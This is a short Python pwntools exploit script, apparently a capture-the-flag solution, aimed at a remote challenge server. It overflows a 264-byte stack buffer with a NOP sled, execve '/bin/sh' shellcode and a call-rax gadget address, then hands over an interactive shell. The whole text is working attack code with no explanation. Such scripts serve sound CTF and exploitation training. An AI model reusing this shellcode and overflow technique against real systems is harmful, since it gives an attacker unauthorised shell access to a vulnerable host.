#!/usr/bin/python

from pwn import *

p = remote("chals20.cybercastors.com",14425)

jmp_rax = p64(0x0000000000400661)

call_rax = p64(0x0000000000400560)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print p.recvuntil("\nSay your name: ")

offset = 256 + 8

payload = "\x90"*(16) + shellcode+"M"*(offset - 16 - len(shellcode)) + call_rax

p.sendline(payload)

p.interactive()
